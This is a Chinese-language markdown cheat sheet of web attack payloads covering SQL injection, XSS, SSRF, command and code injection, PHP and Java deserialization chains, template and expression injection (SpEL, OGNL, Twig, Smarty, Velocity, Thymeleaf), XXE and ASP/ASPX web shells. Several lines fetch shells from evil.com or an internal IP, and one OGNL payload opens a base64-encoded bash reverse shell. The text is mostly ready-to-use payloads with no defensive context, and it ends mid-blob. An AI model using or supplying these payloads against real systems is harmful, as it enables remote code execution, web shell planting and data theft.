# SQL注入Payload
```php
/?id=1%27%20union%20select%201,2,3,454%20--
/?id=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15%20--
```


# XSS跨站脚本攻击Payload
```php
/?id=<script>alert(1)</script>
/?id=<img src=x onerror=alert(1)>
/?id=<svg/onload=alert(1)>
```


# 文件上传Payload
```php
curl -F "file=@/path/to/malicious.php" http://example.com/upload
curl -F "file=@/path/to/malicious.jpg" http://example.com/upload
curl -F "file=@/path/to/malicious.gif" http://example.com/upload
curl -F "file=@/path/to/malicious.png" http://example.com/upload
curl -F "file=@/path/to/malicious.txt" http://example.com/upload
```

# SSRF服务器端请求伪造
```php
/?url=http://192.168.10.1:6666
/?url=file:///etc/passwd
/?url=php://filter/read=convert.base64-encode/resource=xxx.php

```

# 命令执行Payload
```php
/?cmd=ls%20-la%20/tmp
/?id=whoami>/tmp/1.txt
/?id=cat%20/etc/passwd>/tmp/1.txt
/?id=cat%20/tmp/1.txt
```


# PHP代码注入Payload
```php
/?id=phpinfo();
/?id=system("ls -la /tmp");
/?id=eval(base64_decode("c3lzdGVtKCJsb3cgLWxhIC90bXAiKTs="));
/?id=assert(base64_decode("c3lzdGVtKCJsb3cgLWxhIC90bXAiKTs="));
/?id=passthru(base64_decode("c3lzdGVtKC Jsb3cgLWxhIC90bXAiKTs="));
```

# PHP反序化漏洞 Payload
```php
/?id=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22think%5Cprocess%5Cpipes%5CWindowsfiles%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A6%3A%22parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22*styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22think%5Cconsole%5COutputhandle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22*handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22*options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A185%3A%22php%3A%2F%2Ffilter%2F%2Fconvert.iconv.UCS-2LE.UCS-2BE%2Fresource%3D%3Fa%20%2F..%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22*tag%22%3Bs%3A3%3A%22123%22%3B%7D%7D%7Ds%3A9%3A%22*append%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22getError%22%3B%7Ds%3A7%3A%22*data%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22123%22%3B%7Ds%3A8%3A%22*error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A2%3A%7Bs%3A11%3A%22*bindAttr%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A27%3A%22dwfeawfwafaaaawwsawwwswssww%22%3B%7Ds%3A8%3A%22*query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22*model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A9%3A%22*styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7Ds%3A28%3A%22think%5Cconsole%5COutputhandle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22*handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22*options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A185%3A%22php%3A%2F%2Ffilter%2F%2Fconvert.iconv.UCS-2LE.UCS-2BE%2Fresource%3D%3Fa%20%2F..%2F%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22*tag%22%3Bs%3A3%3A%22123%22%3B%7D%7D%7D%7D%7D%7D%7D%7D
```



# Java代码注入 Payload
```java
/?id=<%%20java.lang.Runtime.getRuntime().exec("ls%20-la%20/tmp");%20%>
/?id=${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
/?id=${pageContext.getServletContext().getRealPath("")}
```

# Java反序化漏洞  Payload
```java
/?id=aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372002a6a6176612e6c616e672e537472696e672443617365496e73656e736974697665436f6d70617261746f7277035c7d5c50e5ce02000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000003cecafebabe00000032004201005f6f72672f6170616368652f736869726f2f636f796f74652f646573657269616c697a6174696f6e2f7374642f456e756d4d6170446573657269616c697a65726565383835356631636137313439323539363465653633366262363463666131070001010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c6574070003010004626173650100124c6a6176612f6c616e672f537472696e673b010003736570010003636d640100063c696e69743e0100032829560100136a6176612f6c616e672f457863657074696f6e07000b0c0009000a0a0004000d0100076f732e6e616d6508000f0100106a6176612f6c616e672f53797374656d07001101000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0c001300140a001200150100106a6176612f6c616e672f537472696e6707001701000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b0c0019001a0a0018001b01000377696e08001d010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a0c001f00200a00180021010007636d642e6578650800230c0005000609000200250100022f630800270c0007000609000200290100072f62696e2f736808002b0100022d6308002d0c00080006090002002f0100186a6176612f6c616e672f50726f636573734275696c646572070031010016285b4c6a6176612f6c616e672f537472696e673b29560c000900330a00320034010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0c003600370a003200380100106a6176612f6c616e672f4f626a65637407003a0100083c636c696e69743e01000463616c6308003d0a0002000d010004436f646501000d537461636b4d61705461626c6500210002000400000003000900050006000000090007000600000009000800060000000200010009000a000100400000008400040002000000532ab7000e1210b80016b6001c121eb600229900101224b300261228b3002aa7000d122cb30026122eb3002a06bd00185903b20026535904b2002a535905b20030534cbb0032592bb70035b6003957a700044cb100010004004e0051000c00010041000000170004ff002100010700020000096507000cfc000007003b0008003c000a000100400000001a000200000000000e123eb30030bb000259b7003f57b10000000000007074002431633030396232642d346238382d343465312d613930652d616533366363383333653165707701007871007e000d78

/?id=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB%2BAARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD%2F%2F%2F%2F%2FdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2BAYIVOACAAB4cAAAA8rK%2Frq%2BAAAAMgBCAQBbb3JnL2FwYWNoZS9jb21tb21zL2JlYW51dGlscy9jb3lvdGUvdHlwZS9Db2xsZWN0aW9uTGlrZVR5cGU2OWQ1MDVlOGU0ZTY0NjdmYTQzZDY4ZTlmMjc4MjMxMQcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ%2BAQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBABBqYXZhL2xhbmcvT2JqZWN0BwA6AQAIPGNsaW5pdD4BAARjYWxjCAA9CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAEAAAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQBBAAAAFwAE%2FwAhAAEHAAIAAAllBwAM%2FAAABwA7AAgAPAAKAAEAQAAAABoAAgAAAAAADhI%2BswAwuwACWbcAP1exAAAAAAAAcHQAJGE5NDhlM2M1LWM0MzgtNDE5NC1hMTBlLWEzNjMwYzQwYTBiN3B3AQB4cQB%2BAA14

```

# XMLDecoder 反序列化
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="1">
                        <void index="0">
                            <string>calc</string>
                        </void>
                    </array>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```



# 模板注入 Payload
```php
/?id={{"".__class__.__base__.__subclasses__()}}111
/?id={{"".__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].popen('ls -la /tmp').read()}}
/?id={{"".__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
/?id={{
"".__class__.__base__.__subclasses__()[0].__init__.__globals__['os'].popen('cat /tmp/1.txt').read()}}

```

# XML外部实体注入(XXE) Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com/malicious.dtd">
<!ENTITY % dtd SYSTEM "http://example.com/malicious.dtd"> %dtd; ]>
<foo>&xxe;</foo>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com/malicious.dtd">
<!ENTITY % dtd SYSTEM "http://example.com/malicious.dtd"> %dtd; ]>
<foo>&xxe;</foo>



```


# ASP/ASPX  代码执行

```
<%ExecuteGlobal request("chopper")%>
<%dy=request("c")%><%Eval(dy)%> 
<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%> 

<%@codepage=65000%>
<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t("#")%>


aspx

<%@ Page Language="Jscript"%><%eval(Request.Item["xindong"],"unsafe");%>

```

# Java 代码块
```
new File('./webapps/ROOT/test.jspx') << new URL('http://192.168.43.81:18080/123.txt').text
Runtime runtime = Runtime.getRuntime(); runtime.exec("id");
new FileOutputStream("shell.jsp").write(new URL("http://evil.com/shell").openStream());

```

# Spel 表达式注入

```
/?id=${T(java.lang.Runtime).getRuntime().exec('ls -la /tmp')}
/id=${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
/id=${T(java.lang.Runtime).getRuntime().exec('cat /tmp/1.txt')

// 复杂的表达式注入
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("java.lang.Runtime.getRuntime().exec('cmd.exe /c ipconfig').getInputStream()")),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())


```

## velocity 表达式注入
```
#set ($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end 

```


## twig 模板注入
```
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{'/etc/xxx'|file_excerpt(1,30)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}

```

## Smarty 模板注入
```
string:{$smarty.template_object->smarty->setCacheDir('./x')->display('string:{system(whoami)}')}

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php phpinfo();",$s)}



```



# Ognl 表达式注入
```
/?id=@java.lang.Runtime@getRuntime().exec("calc")
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

// 复杂的表达式注入 St2 
/index?id=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]


%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyMC4xNjYvNjY2NiAwPiYx=}|{base64,-d}|{bash,-i}'))}



```
# thymeleaf 模板注入
```
data=__|$${0327.getClass().forName('org.springframework.cglib.core.ReflectUtils').defineClass('org.springframework.expression.nu11',0327.getClass().forName('org.springframework.util.StreamUtils').copyToByteArray(new.java.util.zip.GZIPInputStream(new.java.io.ByteArrayInputStream(0327.getClass().forName('org.springframework.util.Base64Utils').decodeFromString('H4sIAAAAAAAA/51YCXwj11n/3lq2tLZz2d0kyrm5dy3bsg5Lsjdto/sc3fcmaUej0WGNRtJodPailJa7UHqxJZSzNaVQNmnxbrptknIkUKAFylluCpSrQKFQmqYx35uRr6wD+eGfLI3e+953/r/j6bMvfvIpADCTNxO4pyVVjd22VBerFYlt8oOW1DDyw7bEd7v1lmgUeyaTFgiB67fYPmsUWLFqjJW2eE7WwhSBqWa3SmAhcrCZkimvcwROtBoESJHAfJWX3QLb7UaRP4FXnTl7HPkKKrLKtlmuxq/WZLm9OuBLqzVWLAu81F1lYsmcuBpz9uRalhX6vA7mCFyHjF1sl7dZVS5E+3DA2g06J39Gqymbs3DpbDJtSLcjoba/EY66XK1hOJSJNMV0uZbIdDO5RoTPNpvrqWamKlubGVtsnHGOGMeQaQpFbzIZ6Gfto1q8L6Z8Q6MzZeuM1n2BvEM0WoPmlKvHOBptVogKlpQ8Dom9rpEzWIyiWTZWHAbO0DcNAt2Bh2PybGGjzdZznV7O2hCj5dRIHKZSOdEvNxzy0CTEPGu2Un2r3e+ESzFbqdm2N5ih5GkKno4cFsVs0xdJNWy8db0rDRhHUvI2m52OoWhKmHKdRDLkqdryLFv3C76tmqfsrw4TDtZUzsU6wsifkTsWJhU3uow1J+t3Bv2ixVuMVm1yM5R1V0V5LWGpWJh+NW3nuDrLhDuMM1RIJ3s2Jmfm2+2o32vJpNlwseb129PZRmm9mQpZLFG7sZxnumsWl7Vk7A5rUobnZVPG0+ECxXGy1yu12yPfVqTrFbpjdzUm2ypjiy8zEkp5f8heSNh9po2Iny+F8plRepCU616Xv+P0GoauptlSyzb8yW4xKMS5QDLg5dqVkifaTY3WBTlvtoVbrlxpIFXzG6O1drGZzQ+bBX8uz/nd6wW7zeSzx4PBQNedY6LNkRCTw6Gavc6u5wte80gueoWUw5UcJMvO+pZnrenP5hKOkq/mE4ahscx5Ev2toGPAs/XwKNBNSOVga8Mt2DvWNaZm67RcPUu5YGA8BdFncUfXsmLOw/WM3oHZlzKOGGZcXPeslfPjVKOYDrMZ2Wry+4VGspx15ZLxZMlf6icGBq/dXCu5A6zgWjMEbLxp0MsW7Hy/wogsN9jy57cGtUzPtJUL8a2cLevfcPYC1aQUMmWH3mHd7cm6In1PxGdrDyNcdVzNDKterijU5HrZzXTMHXFoHmatQ68jXOkIrkw0U+oE5fV0lguPfMUen6mn3F55tBVMJdKx+laiVi8Hmw3WnjBk5W6rPkqHW05bKs1WSsGo3++IJ1MuzmqL1Pm8dTCKJgS/mc0HSmLBUm27PFl3eugpyxzHNPpcQHCWe93QuNrxmuNeh5zfCEclXyNcKEYyqVh7kC2bBmzQk3FshRMZg5mxudY9rTVrM5eruJKVaqTmrUrFSH/d4w6EM7lMNlJIpmtxo5cTQsI6I5Sa5UR0yDV9hZDL4rMIpVp4LEv+Qs69lbCN7TlfwisNREsqFUy6241mXCjnOR9bTqwHraG24EwN/GkpvC6w/KibG1QcOUkKbPn4jlAZ+ppJQz3bEbZka8JSLyYjxlaaSUqWQMBWt7QMYWvaHO7GbUmXuSoUitZIYTzmQ5ZWVxRysq0hucyWkuzi2f5Wdth3lQJrcsq7PjBxvriv7263OVOe9Qm9rrcRq5R4b9nal/oJWcqXGHm9Yu4HjGKqUKn1va54LbjhS/q2NmrRukloJIxsyZa3NsPr3bw3b2PsFc7WbeVyYaGZZyNdR6rmFTptt1iKuKRiuJryt6teNhle7/RcyWI72PK5uoNuJGPi1wZmydSuFjaq41rMZKkXPNGau+BppMxysOKMt4yZvi3a7ybadd7VZvnBWomPiu1Ku28usn7WlBqOx7l8MG8t2ILFcCbZzduSa4lsOx6KGANxTDrRINkCvL/HSMVyshn3mdzrzKhg6/H5tNnlkerVfMNhdkdNghSQ/GIxPgxn1ze8hUrEFutvxU1CINKw1Uzu8KDF2UdbddYeH/j8aUOP73GVgcvLBqrDCl+sN5qmqtRaMxuquZRxK1Rw9uvsuBdN2KQwJ1aSqY6DyZgqsbB7lOry5bahsOHKd9PBkNeHbaDsHIgZs2vscBrGvlg3NHRGjQX/BqKPc+SsBdbEdQq91ihn9W+0mkZXYIMbeoOBlo0ZeQXGEgtmC+YmE7IPt8KN9XYs5urEGJ+dTVkKteY4XgwZs2Nnbsvbz/fXMo5Iq2nJBVwBk7eZ41Lr4yC31Sz1HVlhVB0l+7a+2x+L+0K8A7PJJIYcVVvd6h2JdWkrXgkbAvUCVk/ewbWqvWg9MBS6wVHcmQyU+LY/Yg+H1+uMo9irGqyWSkLimKYYkpNmcWhZCzM+seCR0lw1WjFEm16+vMYk05iC6z3buBc3RFJCTirHHVnRlDMlKw6f1HXH170jq2yLhcalsFjLF9J2Y3Qju2G3WYO2RtNuMdqyXGQQMTS4ZilTdVedTh1cS2DmwbpYl1+Dnf/M2SyBxYNOnq5JrQFbEngtLBzZ8A45vi3jMKGFV2HT7vbE1Wa9y61mxC5bwU5+Iy4eUCuTghZuJqCttCR1ZLjvzNUTw+EhQjlzbh5ugVtnQQ+3ETgp1/g9/nfg8IKTgofnBFbiy746L5Rx3vg/eEp8RcApx6iQI+/TcBflfTeBm16GSAv3Erimy8tOjqPTE7qCgOZM8Wx2Hu6HB2bhPjiDfkNVCNx/WLo6Tx2RPlmahyUw0IPLaBIeZFrlnoAmrU6+8nKthbY8dIwt56/yz3HWqRxQzhqYqHlmjNz5q/XQgpXAzS93XAs2BEZd7LcaaPHGMaYdw/JYax2wMQt22CSg2xsaUaEzx8X6QXj1LGgAkXhDSzmuxCBWqWAAdPAQKtScOMtF4NqD85GWWNWCR50enWI5xcuqeB34MFzpQtyLLI8RGIDgSfBCaB6uhxuo6Mg8aEF3Ek5AlMAs1bclyvwQo3vDnsY9uS4YUQIej0NiFkmTCJEjW1pIH4GUGj5Xry6UeUkL2VnIUUnTMEMlFdAutt3mxVeA4COcUIPz8DBl9giazqmanuYlqSVtntbB61R/eOl3BsHLVjGSZw8L2E/vY2QgcxZK1DwOIye31NV54GGWSqygR/Ykii35dKXVE8s6qCFtXeYlVm5JBG484rPgZB05b0FjDjIg4DXj6n0tiFgoamw3qjgei1JxHtrQmYMWIFONqCwfvXLso02GHqXrY/Qm6m2ePq+DIeLlIJrJVusV5Ou+H8bwBuqHN+L95xH065tVJKdqvCDMw7fRZD4Bb1WyhfIg8MAxjI8RhSXkbfAd9PDbCcydNy49clri2fJoVgffSSslWxf4Msr7brxy4dr3HrmvpUZdmW9q4fvRQa0eCj2lSqi3jHFUW0blebaJyv8A/OBJeCe8C+NFlealvrDvBx28G69yapLv1Z1H/nflX7YSvdJy8F54HzX5/UcCEmflmg4uHLVQkaSFH0FfICXtGvPwoxR9evggrtW73mZbHs3Dj0NnFh6Dn6BQMZ7VwU+hv87o4EP4gd+2aat5Seo+eLVir8Hr6g0HRAG2W1MS+Wdn4aMQOaIYZg2GSQs/r7rUKQgpmeUaaYnFFvHSQsGwbTT6F+DiLHwMHj9SKHBLCx9H3DT4Ecqah1+ExBx8AnYoKVp4G3UOWxd5yYXscVbCDItLLdqHWpIOnkQYcioFSr31cNjcNVZK8Z0eL3KY2pg9V+BT1EWfRmEyK1VpNX0adcEHpcLi9buHtcHxikJ/bFQ/A79Eo/rLVECt3r13TQe/SvWrYaGSeFEHz+FOn4pBXW8+4iF3S6B9B2cJ5PPr8Fnqgt/A/D6OQgu/NQefo3Vjhi2X0fME9GeO50XN/m34HVpmfhez4wBrClwjLRYLKD19VR9St1CX34Pfp5H4A9VRqXqzLfAqCv9IReEfYx9bNeT4ElbvQ0d18CcIzyYrczVq7anjSjoq92fw5zQmf4FtX+K7rZ6EgdXBX2GBo+VJB19C/2FP6Obqcm0e/lal/jvkzO0l798j4tENLxGxl3wo4h/hn6j9/zzJtQMV5+FfqHF6+Nd5OEmNOQFfRTbHekIL/4EqCvisLM7Df9KJ7GvwX/NwjXr0v7GIlHmuVebVX25o4T/G5vOueXgevklPvEA1GtfbOL+1msrvUhjRM+ddCs2LsIs0mL0wV+YriH9Fro7g0onzLi3R7GWqwj2IzqiilmTmJNFCSM3JvblQLWrz5KQyCZFZOojgvKZVkBirUEWDhwEwYXZunlxDrp0lWnIdqnFeR25AXUR+EBS7Mos5NU8WoUcZ4uw7h+Li9TYvoKI6cqM6xCm/Z6HKN+8VDgWdTkliR10tuYXCtxupd2Vam16+cCqHKBnqcxu5fZbcSu7Ym3v297Tk9By5i6aE/tCvbRwrs6gRu6r+skbuQTAhVCbf7puotUq5rKpB05EH1InHo0RS0pGzqKYaVh0xoKv2h3yXM+W1WffpVg7C36tU6Ipx766A3SgYO7grEBOB2/c2XCOZVzwS68nt3qRhaYllllhpwb39wEwEitFfDMaD4iE6HE9vu4rVEQoHgWmKKeyz15PNWbJBztHas98nDxGfU4lePUvsBKdPDS3wk9PBefIQcdINnDmnBxJONwgg3AkG8RDxEC8qTHDMnJNb+3rQOwLFMgmQIN1GWE5zQquLyIngoInMGLrMELjjIPjRVqrH1ZSCfMhlcQKnDwEU61uVFdTbyCGq5KRI9dq8xClpStJ0mNaTDM5YpxWmB3MaTock9zKVSXFEYZYk6M+8r///DQMPLr3mFc4DBO58qQPUnD1kGw63C+riUQteN0sepUouXD2MaEmJwC0Hq8meKNeb/CGmGN6blMn4tDL+oBmnm4oMyhkLw9Ixvjl+clYcVpslPKkfgv2hIUxLGgdtCrcO431yvDlLBIJT73Vt9djeOHEEr4fnOgq9NsG5Z5FINGEqlAHCSfcgJ0wu86AjA1prMZc0bkxORIjCGMeONKvcY2f3/YHl92SqXhVZuSfxcBee0gDg+yy9o+DTLL0V4ee1WJSxXwAhY/x2HdAiDTC1MH8R6B+hHeGqzev2NvGOpW6eAJUfeefCTZfh9ohh4c4duIdZ1uzA2WWyAyvRBf2CcerToN8By4KGPAPrO3BuU7OyA69dcGpwvTC1cF8KNzen9dMruKDBBf2CG7ng6rlnwLs5oxD7Z1RiTaqgeQLCqcI0PtJzWr12ZUY9dwL39DO4padb53LboIlswxQsXQLmCYhdAM3jJLK0AylcvZe5ArnCJcg/AcUdeHTh9fi2tHwJyvi5A9WPQ9HwHNxxlKa+v7cN7zY8CU0CzPKTgD6/AG/DhwGB6NETI8p15RK8iX55y/5xuvTtm5qlFT066h1Hj3zXISGGTc3Rze+h/PQaVc2F7zsg3R1rPg6xJ+CHkDCXexyN/ggdUxFVOpIiWVjEuL0H3g+nMG5vwOcAzH0d3q/F7yd2YQ6w4WIodxESJ7T0laEri6fveAFmtNDahUdAo67jNy1Ciu4+Dw88j6dO0FvVBCrvwy2Kt9cRxrDwHkIuww8vfED5eAYeYzAcUQPGcgd+LLr8HEyvXFzegZ+8ADdNbFyhNv20atPFw2sfxrdl+vAzk02E4AlU/eZ9c24HzS5+nVKURFUfoxqeghfgGny+Bcnxgg9TVEdyOx49iUe+fAU+ihJ+LnIZnngSLqmhxIhGVyYRfW5Fiegz8LFNDY3T5YVP7sBTF6Co1yw8cxl+ZeFZ+vZr+PYMfILC90n4TQJPwucJbM7oZyZcztInZENxuk+sM+h1E+ovnIDc9u4XtiFDZfzhs8Aon4qbvki5LvzpDvzlBbApywt/jRwo92fhPv2M6suFv9mBL1+AU/qZhX+gu1qDXvskfEXhazPQlFV9dC/MvAg3KzGkYXwRPFr4mBY+gc/fAOOJ5yGB4SRvREqML5wib1IKx0fwH2/GuEMD/HksIlr8/IAax39jSHQZE+rfd+Dr0W0oIqR34BuX4VuXCdmcXvjaIplS03aRTNO8JTpMTvq+Q+aoFZodMq+fWVbTV09Jpi6T62kCTz9FH5QKoD+aU4tkQYUDtf1oWq3skFMUG1hM4cZ9bNxKIX7jBMD4/jUtjssUHt+E7IG5+I93+ImZj0+q5JsMi+QmBb/RlUWinyB5HV8UEpfJnUrYyd1HIn73oYirWqoeeorWn+3dL05ct0juRa9hdVsk96uFEEuXWgCXUygHk3gvcnfD1C6GQLtngfpa15K7MHYA9x2JG/7z+7X7+kntxpJZVIv3STq5T8x8F0ZzCj9bi+SMUr0XydKkVhP8RMCdY6ijF8nypFQ/RkvusqrlkhIeMo2vi8wiWZ1wWDtMasCIXE2tqPQQOPdDpAPydXBiSA6ZcZJeHyaKPo3di8Lu4SvEWrhE1iOEuULshStko7B0iTx4ibyWueF6+JQuuowQcBdsmg/CtYaVqVOIL//27ldQi/Dm9PKzoF3eIViCSEw/fXFz5sjCzNNKl3wQwignDIzyqWrnhOkX4bSWWLXEriXTL6CatLCQ6V3qP/xUt5SiSEuo9mCJtkcsvXtmETNu4w17YpY8KZdhBMhrmeUFzYfg9mWExz3RFdpAV3B55